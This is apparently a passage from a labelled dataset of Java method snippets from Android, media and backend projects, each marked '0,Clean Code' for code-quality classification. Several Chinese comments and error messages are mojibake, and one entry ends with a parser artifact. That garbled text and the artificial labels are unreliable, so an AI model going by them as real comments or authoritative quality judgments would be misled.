  TUILog.i(TAG,""getUserInfo, list: "" + list);
  if (callback != null) {
    callback.onSuccess(list);
  }
}
void onSuccess(List<CallingUserModel> list);",0,Clean Code
"/** 
 * @param schemeIdUri The message scheme.
 * @param value The value for the event.
 * @param durationMs The duration of the event in milliseconds.
 * @param id The instance identifier.
 * @param messageData The body of the message.
 */
public EventMessage(String schemeIdUri,String value,long durationMs,long id,byte[] messageData){
  this.schemeIdUri=schemeIdUri;
  this.value=value;
  this.durationMs=durationMs;
  this.id=id;
  this.messageData=messageData;
}
EventMessage(Parcel in){
  schemeIdUri=castNonNull(in.readString());
  value=castNonNull(in.readString());
  durationMs=in.readLong();
  id=in.readLong();
  messageData=castNonNull(in.createByteArray());
}
",0,Clean Code
"FragmentState(Fragment frag){
  mClassName=frag.getClass().getName();
  mWho=frag.mWho;
  mFromLayout=frag.mFromLayout;
  mFragmentId=frag.mFragmentId;
  mContainerId=frag.mContainerId;
  mTag=frag.mTag;
  mRetainInstance=frag.mRetainInstance;
  mRemoving=frag.mRemoving;
  mDetached=frag.mDetached;
  mArguments=frag.mArguments;
  mHidden=frag.mHidden;
  mMaxLifecycleState=frag.mMaxState.ordinal();
}
FragmentState(Parcel in){
  mClassName=in.readString();
  mWho=in.readString();
  mFromLayout=in.readInt() != 0;
  mFragmentId=in.readInt();
  mContainerId=in.readInt();
  mTag=in.readString();
  mRetainInstance=in.readInt() != 0;
  mRemoving=in.readInt() != 0;
  mDetached=in.readInt() != 0;
  mArguments=in.readBundle();
  mHidden=in.readInt() != 0;
  mSavedFragmentState=in.readBundle();
  mMaxLifecycleState=in.readInt();
}",0,Clean Code
"private void setAdapterListener(){
  mListAdapter.setOnCallRecordItemListener(new ICallRecordItemListener(){
    @Override public void onItemClick(    View view,    int viewType,    TUICallDefine.CallRecords callRecords){
      if (callRecords == null) {
        return;
      }
      if (mListAdapter.isMultiSelectMode()) {
        return;
      }
      if (callRecords.scene.equals(TUICallDefine.Scene.GROUP_CALL)) {
        startGroupInfoActivity(callRecords);
        Toast.makeText(getContext(),R.string.tuicallkit_group_recall_unsupport,Toast.LENGTH_SHORT).show();
        return;
      }
      if (TUICallDefine.Role.Caller.equals(callRecords.role)) {
        TUICallKit.createInstance(getContext()).call(callRecords.inviteList.get(0),callRecords.mediaType);
      }
 else {
        TUICallKit.createInstance(getContext()).call(callRecords.inviter,callRecords.mediaType);
      }
    }
    @Override public void onItemDeleteClick(    View view,    int viewType,    TUICallDefine.CallRecords callRecords){
      if (callRecords == null) {
        return;
      }
      List<TUICallDefine.CallRecords> list=new ArrayList<>();
      list.add(callRecords);
      deleteRecordCalls(list);
    }
    @Override public void onDetailViewClick(    View view,    TUICallDefine.CallRecords records){
      if (records == null) {
        return;
      }
      if (TUICallDefine.Scene.SINGLE_CALL.equals(records.scene)) {
        startFriendProfileActivity(records);
      }
 else       if (TUICallDefine.Scene.GROUP_CALL.equals(records.scene)) {
        startGroupInfoActivity(records);
      }
    }
  }
);
}",0,Clean Code
"/** 
 * Joins the elements of the provided  {@code Iterator} intoa single String containing the provided elements.</p> <p/> No delimiter is added before or after the list. A  {@code null} separator is the same as an empty String ("""").</p><p/> Copied from Commons Lang, version 3 (r1138702).</p>
 * @param iterator  the {@code Iterator} of values to join together, may be null
 * @param separator the separator character to use, null treated as """"
 * @return the joined String, {@code null} if null iterator input
 * @since 1.2
 */
public static String join(Iterator<?> iterator,String separator){
  final String empty="""";
  if (iterator == null) {
    return null;
  }
  if (!iterator.hasNext()) {
    return empty;
  }
  Object first=iterator.next();
  if (!iterator.hasNext()) {
    return first == null ? empty : first.toString();
  }
  StringBuilder buf=new StringBuilder(256);
  if (first != null) {
    buf.append(first);
  }
  while (iterator.hasNext()) {
    if (separator != null) {
      buf.append(separator);
    }
    Object obj=iterator.next();
    if (obj != null) {
      buf.append(obj);
    }
  }
  return buf.toString();
}",0,Clean Code
"public boolean arrowScroll(int direction){
  View currentFocused=findFocus();
  if (currentFocused == this)   currentFocused=null;
  boolean handled=false;
  View nextFocused=FocusFinder.getInstance().findNextFocus(this,currentFocused,direction);
  if (nextFocused != null && nextFocused != currentFocused) {
    if (direction == View.FOCUS_LEFT) {
      handled=nextFocused.requestFocus();
    }
 else     if (direction == View.FOCUS_RIGHT) {
      if (currentFocused != null && nextFocused.getLeft() <= currentFocused.getLeft()) {
        handled=pageRight();
      }
 else {
        handled=nextFocused.requestFocus();
      }
    }
  }
 else   if (direction == FOCUS_LEFT || direction == FOCUS_BACKWARD) {
    handled=pageLeft();
  }
 else   if (direction == FOCUS_RIGHT || direction == FOCUS_FORWARD) {
    handled=pageRight();
  }
  if (handled) {
    playSoundEffect(SoundEffectConstants.getContantForFocusDirection(direction));
  }
  return handled;
}
",0,Clean Code
"/** 
 * Derives a track sample format from the corresponding format in the master playlist, and a sample format that may have been obtained from a chunk belonging to a different track.
 * @param playlistFormat The format information obtained from the master playlist.
 * @param sampleFormat The format information obtained from the samples.
 * @param propagateBitrate Whether the bitrate from the playlist format should be included in thederived format.
 * @return The derived track format.
 */
private static Format deriveFormat(Format playlistFormat,Format sampleFormat,boolean propagateBitrate){
  if (playlistFormat == null) {
    return sampleFormat;
  }
  int bitrate=propagateBitrate ? playlistFormat.bitrate : Format.NO_VALUE;
  int channelCount=playlistFormat.channelCount != Format.NO_VALUE ? playlistFormat.channelCount : sampleFormat.channelCount;
  int sampleTrackType=MimeTypes.getTrackType(sampleFormat.sampleMimeType);
  String codecs=Util.getCodecsOfType(playlistFormat.codecs,sampleTrackType);
  String mimeType=MimeTypes.getMediaMimeType(codecs);
  if (mimeType == null) {
    mimeType=sampleFormat.sampleMimeType;
  }
  return sampleFormat.copyWithContainerInfo(playlistFormat.id,playlistFormat.label,mimeType,codecs,playlistFormat.metadata,bitrate,playlistFormat.width,playlistFormat.height,playlistFormat.frameRate,channelCount,playlistFormat.selectionFlags,playlistFormat.language);
}
",0,Clean Code
"@Test public void testDiscardToStopAtReadPosition(){
  writeTestData();
  sampleQueue.discardTo(LAST_SAMPLE_TIMESTAMP,false,true);
  assertThat(sampleQueue.getFirstIndex()).isEqualTo(0);
  assertThat(sampleQueue.getReadIndex()).isEqualTo(0);
  assertAllocationCount(10);
  assertReadTestData(null,0,1);
  sampleQueue.discardTo(SAMPLE_TIMESTAMPS[1] - 1,false,true);
  assertThat(sampleQueue.getFirstIndex()).isEqualTo(0);
  assertThat(sampleQueue.getReadIndex()).isEqualTo(1);
  assertAllocationCount(10);
  sampleQueue.discardTo(SAMPLE_TIMESTAMPS[1],false,true);
  assertThat(sampleQueue.getFirstIndex()).isEqualTo(1);
  assertThat(sampleQueue.getReadIndex()).isEqualTo(1);
  assertAllocationCount(9);
  sampleQueue.discardTo(LAST_SAMPLE_TIMESTAMP,false,true);
  assertThat(sampleQueue.getFirstIndex()).isEqualTo(1);
  assertThat(sampleQueue.getReadIndex()).isEqualTo(1);
  assertAllocationCount(9);
  assertReadTestData(FORMAT_1,1,7);
  assertThat(sampleQueue.getFirstIndex()).isEqualTo(1);
  assertThat(sampleQueue.getReadIndex()).isEqualTo(8);
  sampleQueue.discardTo(LAST_SAMPLE_TIMESTAMP - 1,false,true);
  assertThat(sampleQueue.getFirstIndex()).isEqualTo(6);
  assertThat(sampleQueue.getReadIndex()).isEqualTo(8);
  assertAllocationCount(3);
  sampleQueue.discardTo(LAST_SAMPLE_TIMESTAMP,false,true);
  assertThat(sampleQueue.getFirstIndex()).isEqualTo(7);
  assertThat(sampleQueue.getReadIndex()).isEqualTo(8);
  assertAllocationCount(1);
}",0,Clean Code
"@SuppressWarnings(""unchecked"") @Override public void writeTo(Serializer output,Value<?> value,MarshalerContext context) throws IOException {
switch (value.getType()) {
case STRING:
    StringAnyValueStatelessMarshaler.INSTANCE.writeTo(output,(String)value.getValue(),context);
  return;
case BOOLEAN:
BoolAnyValueStatelessMarshaler.INSTANCE.writeTo(output,(Boolean)value.getValue(),context);
return;
case LONG:
IntAnyValueStatelessMarshaler.INSTANCE.writeTo(output,(Long)value.getValue(),context);
return;
case DOUBLE:
DoubleAnyValueStatelessMarshaler.INSTANCE.writeTo(output,(Double)value.getValue(),context);
return;
case ARRAY:
output.serializeMessageWithContext(io.opentelemetry.proto.common.v1.internal.AnyValue.ARRAY_VALUE,(List<Value<?>>)value.getValue(),ArrayAnyValueStatelessMarshaler.INSTANCE,context);
return;
case KEY_VALUE_LIST:
output.serializeMessageWithContext(io.opentelemetry.proto.common.v1.internal.AnyValue.KVLIST_VALUE,(List<KeyValue>)value.getValue(),KeyValueListAnyValueStatelessMarshaler.INSTANCE,context);
return;
case BYTES:
BytesAnyValueStatelessMarshaler.INSTANCE.writeTo(output,(ByteBuffer)value.getValue(),context);
return;
}
throw new IllegalArgumentException(""Unsupported value type."");
}",0,Clean Code
"/** 
 * Returns the first field of the given type in a class. Might be useful for Proguard'ed classes to identify fields with unique types.
 * @param clazz The class which either declares or inherits the field.
 * @param type  The type of the field.
 * @return A reference to the first field of the given type.
 * @throws NoSuchFieldError In case no matching field was not found.
 */
public static Field findFirstFieldByExactType(Class<?> clazz,Class<?> type){
  Class<?> clz=clazz;
  do {
    for (    Field field : clz.getDeclaredFields()) {
      if (field.getType() == type) {
        field.setAccessible(true);
        return field;
      }
    }
  }
 while ((clz=clz.getSuperclass()) != null);
  throw new NoSuchFieldError(""Field of type "" + type.getName() + "" in class ""+ clazz.getName());
}
",0,Clean Code
"private boolean isNeighbour(Direction dir){
  blockPos.set(x + dir.getOffsetX(),y + dir.getOffsetY(),z + dir.getOffsetZ());
  BlockState neighbourState=mc.world.getBlockState(blockPos);
  if (neighbourState.getBlock() != state.getBlock())   return false;
  VoxelShape cube=VoxelShapes.fullCube();
  VoxelShape shape=state.getOutlineShape(mc.world,blockPos);
  VoxelShape neighbourShape=neighbourState.getOutlineShape(mc.world,blockPos);
  if (shape.isEmpty())   shape=cube;
  if (neighbourShape.isEmpty())   neighbourShape=cube;
switch (dir) {
case SOUTH:
    if (shape.getMax(Direction.Axis.Z) == 1 && neighbourShape.getMin(Direction.Axis.Z) == 0)     return true;
  break;
case NORTH:
if (shape.getMin(Direction.Axis.Z) == 0 && neighbourShape.getMax(Direction.Axis.Z) == 1) return true;
break;
case EAST:
if (shape.getMax(Direction.Axis.X) == 1 && neighbourShape.getMin(Direction.Axis.X) == 0) return true;
break;
case WEST:
if (shape.getMin(Direction.Axis.X) == 0 && neighbourShape.getMax(Direction.Axis.X) == 1) return true;
break;
case UP:
if (shape.getMax(Direction.Axis.Y) == 1 && neighbourShape.getMin(Direction.Axis.Y) == 0) return true;
break;
case DOWN:
if (shape.getMin(Direction.Axis.Y) == 0 && neighbourShape.getMax(Direction.Axis.Y) == 1) return true;
break;
}
return false;
}",0,Clean Code
"public TextPaintView(Context context,Point position,int fontSize,CharSequence text,Swatch swatch,int type){
  super(context,position);
  baseFontSize=fontSize;
  editText=new EditTextOutline(context){
{
      animatedEmojiOffsetX=AndroidUtilities.dp(8);
    }
    @Override public boolean dispatchTouchEvent(    MotionEvent event){
      if (selectionView == null || selectionView.getVisibility() != VISIBLE) {
        return false;
      }
      return super.dispatchTouchEvent(event);
    }
  }
;
  editText.setGravity(Gravity.LEFT | Gravity.CENTER_VERTICAL);
  editText.setBackgroundColor(Color.TRANSPARENT);
  editText.setPadding(AndroidUtilities.dp(7),AndroidUtilities.dp(7),AndroidUtilities.dp(7),AndroidUtilities.dp(7));
  editText.setClickable(false);
  editText.setEnabled(false);
  editText.setCursorColor(0xffffffff);
  editText.setTextSize(TypedValue.COMPLEX_UNIT_PX,baseFontSize);
  editText.setCursorSize(AndroidUtilities.dp(baseFontSize * 0.4f));
  editText.setText(text);
  editText.setTextColor(swatch.color);
  editText.setTypeface(null,Typeface.BOLD);
  editText.setHorizontallyScrolling(false);
  editText.setImeOptions(EditorInfo.IME_FLAG_NO_EXTRACT_UI);
  editText.setFocusableInTouchMode(true);
  editText.setInputType(editText.getInputType() | EditorInfo.TYPE_TEXT_FLAG_CAP_SENTENCES);
  addView(editText,LayoutHelper.createFrame(LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT,Gravity.LEFT | Gravity.TOP));
  if (Build.VERSION.SDK_INT >= 23) {
    editText.setBreakStrategy(Layout.BREAK_STRATEGY_SIMPLE);
  }
  setSwatch(swatch);
  setType(type);
  updatePosition();
  editText.addTextChangedListener(new TextWatcher(){
    private String text;
    private int beforeCursorPosition=0;
    @Override public void beforeTextChanged(    CharSequence s,    int start,    int count,    int after){
      text=s.toString();
      beforeCursorPosition=start;
    }
    @Override public void onTextChanged(    CharSequence s,    int start,    int before,    int count){
    }
    @Override public void afterTextChanged(    Editable s){
      editText.removeTextChangedListener(this);
      if (editText.getLineCount() > 9) {
        editText.setText(text);
        editText.setSelection(beforeCursorPosition);
      }
      editText.addTextChangedListener(this);
    }
  }
);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@2d222d36",0,Clean Code
"/** 
 * 处理单项权限
 */
private void processSinglePermission(){
  final GroupPermission permission=allPermissions.get(currentIdx);
switch (permission.permissionType) {
case PERMISSION_FLOAT:
    if (!processFloatPermission()) {
      return;
    }
  break;
case PERMISSION_ROOT:
if (!processRootPermission()) {
  return;
}
break;
case PERMISSION_ADB:
if (!processAdbPermission()) {
return;
}
break;
case PERMISSION_TOAST:
if (!processToastPermission(permission)) {
return;
}
break;
case PERMISSION_USAGE:
if (!processUsagePermission()) {
return;
}
break;
case PERMISSION_ACCESSIBILITY:
if (!processAccessibilityPermission()) {
return;
}
break;
case PERMISSION_RECORD:
if (!processRecordPermission()) {
return;
}
break;
case PERMISSION_ANDROID:
if (!processAndroidVersionPermission(permission)) {
return;
}
break;
case PERMISSION_DYNAMIC:
if (!processDynamicPermission(permission)) {
return;
}
break;
case PERMISSION_BACKGROUND:
if (!processBackgroundPermission()) {
return;
}
break;
case PERMISSION_POWER_SAVE:
if (!processPowerSavePermission()) {
return;
}
break;
}
processedAction();
}
",0,Clean Code
"public static <T>Set<T> convertSet(Collection<T> from){
  return convertSet(from,v -> v);
}
public static <T,U>Set<U> convertSet(Collection<T> from,Function<T,U> func){
  if (CollUtil.isEmpty(from)) {
    return new HashSet<>();
  }
  return from.stream().map(func).filter(Objects::nonNull).collect(Collectors.toSet());
}
public static <T,U>Set<U> convertSet(Collection<T> from,Function<T,U> func,Predicate<T> filter){
  if (CollUtil.isEmpty(from)) {
    return new HashSet<>();
  }
  return from.stream().filter(filter).map(func).filter(Objects::nonNull).collect(Collectors.toSet());
}
",0,Clean Code
"/** 
 * Get category according to button.
 * @return the category of this view
 */
public int getCategory(){
  int category=0;
  if (!mDoujinshi.isChecked())   category|=EhConfig.DOUJINSHI;
  if (!mManga.isChecked())   category|=EhConfig.MANGA;
  if (!mArtistCG.isChecked())   category|=EhConfig.ARTIST_CG;
  if (!mGameCG.isChecked())   category|=EhConfig.GAME_CG;
  if (!mWestern.isChecked())   category|=EhConfig.WESTERN;
  if (!mNonH.isChecked())   category|=EhConfig.NON_H;
  if (!mImageSets.isChecked())   category|=EhConfig.IMAGE_SET;
  if (!mCosplay.isChecked())   category|=EhConfig.COSPLAY;
  if (!mAsianPorn.isChecked())   category|=EhConfig.ASIAN_PORN;
  if (!mMisc.isChecked())   category|=EhConfig.MISC;
  return category;
}",0,Clean Code
"@Override public int saveUser(TeslaServiceUserDO teslaServiceUser){
  TeslaServiceUserExample example=new TeslaServiceUserExample();
  Criteria criteria=example.createCriteria();
  criteria.andUsernameEqualTo(teslaServiceUser.getUsername());
  List<TeslaServiceUserDO> teslaServiceUsers=teslaServiceUserMapper.selectByExample(example);
  if (teslaServiceUsers == null || teslaServiceUsers.size() == 0) {
    return teslaServiceUserMapper.insert(teslaServiceUser);
  }
 else {
    TeslaServiceUserDO oldTeslaServiceUser=teslaServiceUsers.get(0);
    oldTeslaServiceUser.setAliww(teslaServiceUser.getAliww());
    oldTeslaServiceUser.setBucUserId(teslaServiceUser.getBucUserId());
    oldTeslaServiceUser.setEmail(teslaServiceUser.getEmail());
    oldTeslaServiceUser.setEmployeeId(teslaServiceUser.getEmployeeId());
    oldTeslaServiceUser.setLogintime(new Date());
    oldTeslaServiceUser.setUsername(teslaServiceUser.getUsername());
    oldTeslaServiceUser.setNickname(teslaServiceUser.getNickname());
    oldTeslaServiceUser.setTelephone(teslaServiceUser.getTelephone());
    return teslaServiceUserMapper.updateByPrimaryKey(oldTeslaServiceUser);
  }
}",0,Clean Code
"/** 
 * Constructs an instance without creating any  {@link Allocation}s up front.
 * @param trimOnReset Whether memory is freed when the allocator is reset. Should be true unlessthe allocator will be re-used by multiple player instances.
 * @param individualAllocationSize The length of each individual {@link Allocation}.
 */
public DefaultAllocator(boolean trimOnReset,int individualAllocationSize){
  this(trimOnReset,individualAllocationSize,0);
}
/** 
 * Constructs an instance with some  {@link Allocation}s created up front. <p> Note:  {@link Allocation}s created up front will never be discarded by  {@link #trim()}.
 * @param trimOnReset Whether memory is freed when the allocator is reset. Should be true unlessthe allocator will be re-used by multiple player instances.
 * @param individualAllocationSize The length of each individual {@link Allocation}.
 * @param initialAllocationCount The number of allocations to create up front.
 */
public DefaultAllocator(boolean trimOnReset,int individualAllocationSize,int initialAllocationCount){
  Assertions.checkArgument(individualAllocationSize > 0);
  Assertions.checkArgument(initialAllocationCount >= 0);
  this.trimOnReset=trimOnReset;
  this.individualAllocationSize=individualAllocationSize;
  this.availableCount=initialAllocationCount;
  this.availableAllocations=new Allocation[initialAllocationCount + AVAILABLE_EXTRA_CAPACITY];
  if (initialAllocationCount > 0) {
    initialAllocationBlock=new byte[initialAllocationCount * individualAllocationSize];
    for (int i=0; i < initialAllocationCount; i++) {
      int allocationOffset=i * individualAllocationSize;
      availableAllocations[i]=new Allocation(initialAllocationBlock,allocationOffset);
    }
  }
 else {
    initialAllocationBlock=null;
  }
  singleAllocationReleaseHolder=new Allocation[1];
}",0,Clean Code
"public Expression buildDecodeExpression(){
  Reference buffer=new Reference(BUFFER_NAME,bufferTypeRef,false);
  ListExpression expressions=new ListExpression();
  if (fury.checkClassVersion()) {
    expressions.add(checkClassVersion(buffer));
  }
  Expression bean;
  if (!isRecord) {
    bean=newBean();
    Expression referenceObject=new Invoke(refResolverRef,""reference"",PRIMITIVE_VOID_TYPE,bean);
    expressions.add(bean);
    expressions.add(referenceObject);
  }
 else {
    if (recordCtrAccessible) {
      bean=new FieldsCollector();
    }
 else {
      bean=buildComponentsArray();
    }
  }
  expressions.addAll(deserializePrimitives(bean,buffer,objectCodecOptimizer.primitiveGroups));
  int numGroups=getNumGroups(objectCodecOptimizer);
  deserializeReadGroup(objectCodecOptimizer.boxedReadGroups,numGroups,expressions,bean,buffer);
  deserializeReadGroup(objectCodecOptimizer.finalReadGroups,numGroups,expressions,bean,buffer);
  deserializeReadGroup(objectCodecOptimizer.otherReadGroups,numGroups,expressions,bean,buffer);
  for (  Descriptor d : objectCodecOptimizer.descriptorGrouper.getCollectionDescriptors()) {
    expressions.add(deserializeGroup(Collections.singletonList(d),bean,buffer,false));
  }
  for (  Descriptor d : objectCodecOptimizer.descriptorGrouper.getMapDescriptors()) {
    expressions.add(deserializeGroup(Collections.singletonList(d),bean,buffer,false));
  }
  if (isRecord) {
    if (recordCtrAccessible) {
      assert bean instanceof FieldsCollector;
      FieldsCollector collector=(FieldsCollector)bean;
      bean=createRecord(collector.recordValuesMap);
    }
 else {
      bean=new StaticInvoke(RecordUtils.class,""invokeRecordCtrHandle"",OBJECT_TYPE,getRecordCtrHandle(),bean);
    }
  }
  expressions.add(new Expression.Return(bean));
  return expressions;
}
",0,Clean Code
"/** 
 * 淇敼淇濆瓨鍙傛暟鏍￠獙
 * @param genTable 涓氬姟淇℃伅
 */
@Override public void validateEdit(GenTable genTable){
  if (GenConstants.TPL_TREE.equals(genTable.getTplCategory())) {
    String options=JSON.toJSONString(genTable.getParams());
    JSONObject paramsObj=JSON.parseObject(options);
    if (StringUtils.isEmpty(paramsObj.getString(GenConstants.TREE_CODE))) {
      throw new ServiceException(""鏍戠紪鐮佸瓧娈典笉鑳戒负绌�"");
    }
 else     if (StringUtils.isEmpty(paramsObj.getString(GenConstants.TREE_PARENT_CODE))) {
      throw new ServiceException(""鏍戠埗缂栫爜瀛楁涓嶈兘涓虹┖"");
    }
 else     if (StringUtils.isEmpty(paramsObj.getString(GenConstants.TREE_NAME))) {
      throw new ServiceException(""鏍戝悕绉板瓧娈典笉鑳戒负绌�"");
    }
 else     if (GenConstants.TPL_SUB.equals(genTable.getTplCategory())) {
      if (StringUtils.isEmpty(genTable.getSubTableName())) {
        throw new ServiceException(""鍏宠仈瀛愯〃鐨勮〃鍚嶄笉鑳戒负绌�"");
      }
 else       if (StringUtils.isEmpty(genTable.getSubTableFkName())) {
        throw new ServiceException(""瀛愯〃鍏宠仈鐨勫閿悕涓嶈兘涓虹┖"");
      }
    }
  }
}
",0,Clean Code
"private void processDone(){
  if (doneButtonDrawable.getProgress() > 0f)   return;
  final boolean empty=geo == null && TextUtils.isEmpty(address);
  if (!empty) {
    if (!hasChanges()) {
      finishFragment();
      return;
    }
    final String address=this.address == null ? """" : this.address.trim();
    if (TextUtils.isEmpty(address) || address.length() > MAX_NAME_LENGTH) {
      BotWebViewVibrationEffect.APP_ERROR.vibrate();
      AndroidUtilities.shakeViewSpring(editText,shiftDp=-shiftDp);
      return;
    }
  }
  doneButtonDrawable.animateToProgress(1f);
  TLRPC.UserFull userFull=getMessagesController().getUserFull(getUserConfig().getClientUserId());
  TLRPC.TL_account_updateBusinessLocation req=new TLRPC.TL_account_updateBusinessLocation();
  if (!empty) {
    if (geo != null) {
      req.flags|=2;
      req.geo_point=new TLRPC.TL_inputGeoPoint();
      req.geo_point.lat=geo.lat;
      req.geo_point._long=geo._long;
    }
    req.flags|=1;
    req.address=address;
    if (userFull != null) {
      userFull.flags2|=2;
      userFull.business_location=new TLRPC.TL_businessLocation();
      userFull.business_location.address=address;
      if (geo != null) {
        userFull.business_location.flags|=1;
        userFull.business_location.geo_point=new TLRPC.TL_geoPoint();
        userFull.business_location.geo_point.lat=geo.lat;
        userFull.business_location.geo_point._long=geo._long;
      }
    }
  }
 else {
    if (userFull != null) {
      userFull.flags2&=~2;
      userFull.business_location=null;
    }
  }
  getConnectionsManager().sendRequest(req,(res,err) -> AndroidUtilities.runOnUIThread(() -> {
    if (err != null) {
      doneButtonDrawable.animateToProgress(0f);
      BulletinFactory.showError(err);
    }
 else     if (res instanceof TLRPC.TL_boolFalse) {
      doneButtonDrawable.animateToProgress(0f);
      BulletinFactory.of(this).createErrorBulletin(LocaleController.getString(R.string.UnknownError)).show();
    }
 else {
      finishFragment();
    }
  }
));
  getMessagesStorage().updateUserInfo(userFull,false);
}",0,Clean Code
"/** 
 * 鏋勫缓鑺傜偣鎺掑簭鐨勫弬鏁�
 * @param request           鎷栨嫿鐨勫墠绔姹傚弬鏁�
 * @param selectIdNodeFunc  閫氳繃id鏌ヨ鑺傜偣鐨勫嚱鏁�
 * @param selectPosNodeFunc 閫氳繃parentId鍜宲os杩愮畻绗︽煡璇㈣妭鐐圭殑鍑芥暟
 * @return
 */
public NodeSortDTO getNodeSortDTO(NodeMoveRequest request,Function<String,BaseModule> selectIdNodeFunc,Function<NodeSortQueryParam,BaseModule> selectPosNodeFunc){
  if (StringUtils.equals(request.getDragNodeId(),request.getDropNodeId())) {
    throw new MSException(Translator.get(""invalid_parameter"") + "": drag node  and drop node"");
  }
  BaseModule dragNode=selectIdNodeFunc.apply(request.getDragNodeId());
  if (dragNode == null) {
    throw new MSException(Translator.get(DRAG_NODE_NOT_EXIST) + "":"" + request.getDragNodeId());
  }
  BaseModule dropNode=selectIdNodeFunc.apply(request.getDropNodeId());
  if (dropNode == null) {
    throw new MSException(Translator.get(DRAG_NODE_NOT_EXIST) + "":"" + request.getDropNodeId());
  }
  BaseModule parentModule;
  BaseModule previousNode;
  BaseModule nextNode=null;
  if (request.getDropPosition() == 0) {
    parentModule=new BaseModule(dropNode.getId(),dropNode.getName(),dropNode.getPos(),dropNode.getProjectId(),dropNode.getParentId());
    NodeSortQueryParam sortParam=new NodeSortQueryParam();
    sortParam.setParentId(dropNode.getId());
    sortParam.setOperator(MOVE_POS_OPERATOR_LATEST);
    previousNode=selectPosNodeFunc.apply(sortParam);
  }
 else {
    if (StringUtils.equalsIgnoreCase(dropNode.getParentId(),ModuleConstants.ROOT_NODE_PARENT_ID)) {
      parentModule=new BaseModule(ModuleConstants.ROOT_NODE_PARENT_ID,ModuleConstants.ROOT_NODE_PARENT_ID,0,dragNode.getProjectId(),ModuleConstants.ROOT_NODE_PARENT_ID);
    }
 else {
      parentModule=selectIdNodeFunc.apply(dropNode.getParentId());
    }
    if (request.getDropPosition() == 1) {
      previousNode=dropNode;
      NodeSortQueryParam sortParam=new NodeSortQueryParam();
      sortParam.setParentId(parentModule.getId());
      sortParam.setPos(previousNode.getPos());
      sortParam.setOperator(MOVE_POS_OPERATOR_MORE);
      nextNode=selectPosNodeFunc.apply(sortParam);
    }
 else     if (request.getDropPosition() == -1) {
      nextNode=dropNode;
      NodeSortQueryParam sortParam=new NodeSortQueryParam();
      sortParam.setParentId(parentModule.getId());
      sortParam.setPos(nextNode.getPos());
      sortParam.setOperator(MOVE_POS_OPERATOR_LESS);
      previousNode=selectPosNodeFunc.apply(sortParam);
    }
 else {
      throw new MSException(Translator.get(""invalid_parameter"") + "": dropPosition"");
    }
  }
  return new NodeSortDTO(dragNode,parentModule,previousNode,nextNode);
}",0,Clean Code
"/** 
 * Gets the expected index of the first char of the composing span within the editor's text. Returns a negative value in case there appears to be no valid composing span.
 * @see #getComposingLength()
 * @see RichInputConnection#hasSelection()
 * @see RichInputConnection#isCursorPositionKnown()
 * @see RichInputConnection#getExpectedSelectionStart()
 * @see RichInputConnection#getExpectedSelectionEnd()
 * @return The expected index in Java chars of the first char of the composing span.
 */
public int getComposingStart(){
  if (!mConnection.isCursorPositionKnown() || mConnection.hasSelection()) {
    return -1;
  }
  return mConnection.getExpectedSelectionStart() - mWordComposer.size();
}",0,Clean Code
"/** 
 * Ignore unpaired ACTION_UP events<br/> Ignore UNKNOWN key codes
 */
private boolean ignoreEvent(KeyEvent event){
  if (event == null || event.getKeyCode() == KeyEvent.KEYCODE_UNKNOWN) {
    return true;
  }
  if (event.getAction() == KeyEvent.ACTION_DOWN) {
    mDownPressed=true;
    return false;
  }
  if (event.getAction() == KeyEvent.ACTION_UP && mDownPressed) {
    mDownPressed=false;
    return false;
  }
  return true;
}
",0,Clean Code
"/** 
 * 鑾峰彇鎸囧畾access_token 杩斿洖access_token鎴朜ot_Login
 */
@GetMapping(""/token/access_token"") public Result getSimplyAccessToken(@RequestParam(""password"") String password,@RequestParam(""tokenName"") String tokenName){
  systemSetting systemSetting=systemService.selectSetting();
  if (!systemSetting.getIsGetToken()) {
    return Result.error(""Not_Open"");
  }
  if (password.equals(systemSetting.getGetTokenPassword())) {
    for (    token token : apiService.selectToken("""")) {
      if (token.getName().equals(tokenName)) {
        if (token.getAccess_token() != null) {
          return Result.success(token.getAccess_token());
        }
        return Result.error(""璇okenName娌℃湁瀛樻斁Access_Token"");
      }
    }
    return Result.error(""鏈壘鍒拌tokenName锛�"");
  }
 else {
    return Result.error(""Not_Login"");
  }
}
",0,Clean Code
"private void appendSuggestions(Video video,MediaItemMetadata mediaItemMetadata){
  if (!video.isRemote && getPlayer().isSuggestionsShown()) {
    Log.d(TAG,""Suggestions is opened. Seems that user want to stay here."");
    return;
  }
  getPlayer().clearSuggestions();
  appendChaptersIfNeeded(mediaItemMetadata);
  appendUserQueueIfNeeded(video);
  appendSectionPlaylistIfNeeded(video);
  List<MediaGroup> suggestions=mediaItemMetadata.getSuggestions();
  if (suggestions == null) {
    String msg=""loadSuggestions: Can't obtain suggestions for video: "" + video.getTitle();
    Log.e(TAG,msg);
    return;
  }
  int groupIndex=-1;
  int suggestRows=-1;
  if (GeneralData.instance(getContext()).isChildModeEnabled() || mPlayerTweaksData.isSuggestionsDisabled()) {
    suggestRows=video.hasPlaylist() ? 1 : 0;
  }
  for (  MediaGroup group : suggestions) {
    groupIndex++;
    if (groupIndex == suggestRows) {
      break;
    }
    if (group != null && !group.isEmpty()) {
      VideoGroup videoGroup=VideoGroup.from(group);
      if (groupIndex == 0) {
        mergeRemoteAndUserQueueIfNeeded(video,videoGroup);
      }
      getPlayer().updateSuggestions(videoGroup);
      mDeArrowProcessor.process(videoGroup);
      if (groupIndex == 0) {
        focusAndContinueIfNeeded(videoGroup);
      }
 else {
        continueGroupIfNeeded(videoGroup);
      }
    }
  }
}",0,Clean Code
"/** 
 * Creates a literal (constant expression). 
 */
public RexNode literal(Object value){
  final RexBuilder rexBuilder=cluster.getRexBuilder();
  if (value == null) {
    final RelDataType type=getTypeFactory().createSqlType(SqlTypeName.NULL);
    return rexBuilder.makeNullLiteral(type);
  }
 else   if (value instanceof Boolean) {
    return rexBuilder.makeLiteral((Boolean)value);
  }
 else   if (value instanceof BigDecimal) {
    return rexBuilder.makeExactLiteral((BigDecimal)value);
  }
 else   if (value instanceof Float || value instanceof Double) {
    return rexBuilder.makeApproxLiteral(BigDecimal.valueOf(((Number)value).doubleValue()));
  }
 else   if (value instanceof Number) {
    return rexBuilder.makeExactLiteral(BigDecimal.valueOf(((Number)value).longValue()));
  }
 else   if (value instanceof String) {
    return rexBuilder.makeLiteral((String)value);
  }
 else   if (value instanceof Enum) {
    return rexBuilder.makeLiteral(value,getTypeFactory().createSqlType(SqlTypeName.SYMBOL),false);
  }
 else {
    throw new IllegalArgumentException(""cannot convert "" + value + "" (""+ value.getClass()+ "") to a constant"");
  }
}
",0,Clean Code
"/** 
